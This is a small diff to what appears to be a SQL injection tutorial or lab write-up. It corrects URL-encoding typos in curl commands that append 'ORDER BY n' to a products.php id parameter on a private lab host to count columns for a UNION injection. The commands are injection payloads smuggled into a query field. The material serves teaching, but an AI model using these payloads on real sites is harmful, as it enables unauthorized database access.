@@ -372,8 +372,8 @@ UNION requires both SELECT statements to have the **same number of columns**. Yo
 
 ```bash
 curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%201"    # works
-curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%202"    # works
-curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%203"    # works
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%202"    # works
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%203"    # works
 curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%204"    # error!
 
 # You need to do %20 for every white space because spaces break curl.
